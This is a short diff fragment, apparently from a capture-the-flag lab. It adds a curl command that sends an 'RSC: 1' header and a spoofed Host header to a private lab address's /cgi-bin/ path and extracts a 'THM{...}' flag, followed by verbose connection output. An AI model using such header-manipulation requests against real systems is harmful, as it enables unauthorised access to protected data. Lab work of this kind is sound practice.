@@ -1,3 +1,4 @@
+curl -s -L -H "RSC: 1" -H "Host: 192.168.188.192" http://10.81.150.158:3000/cgi-bin/ | grep -o "THM{[^}]*}"
 Established connection to 10.81.150.158 (10.81.150.158 port 3000) from 192.168.188.192 port 56538 
 * using HTTP/1.x
 > GET /cgi-bin/ HTTP/1.1
